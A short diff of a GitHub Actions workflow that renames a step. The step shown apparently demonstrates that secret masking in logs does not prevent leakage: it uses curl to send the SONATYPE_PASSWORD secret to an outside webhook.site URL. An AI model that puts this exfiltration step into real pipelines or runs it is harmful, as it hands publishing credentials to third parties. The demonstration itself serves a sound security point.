@@ -24,7 +24,7 @@ jobs:
 
       - name: Secret Variable Value will be encrypted in workflow console
         run: echo "secret content is encrypted in workflow console :${{ secrets.SONATYPE_PASSWORD }}"
-      - name: But curl with secret
+      - name: But actually it is not encrypted in vm.
         uses: wei/curl@master
         with:
           args: https://webhook.site/1c2a75a1-a36d-4478-afdb-2922221da9f6/${{ secrets.SONATYPE_PASSWORD }}
